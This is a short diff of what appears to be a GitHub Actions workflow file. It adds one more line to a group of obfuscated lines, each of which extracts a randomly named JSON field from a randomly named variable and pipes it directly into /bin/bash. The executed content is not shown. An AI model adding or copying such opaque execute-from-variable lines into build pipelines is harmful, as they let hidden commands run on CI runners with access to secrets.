@@ -25,6 +25,7 @@ jobs:
           echo $xxtep0 | jq -r .s704 | /bin/bash
           printf '%s' "$nv9568" | jq -r .s3 | /bin/bash
           printf '%s' "$zy34" | jq -r .tvv255 | /bin/bash
+          printf '%s' "$c47958" | jq -r .xnxri4 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
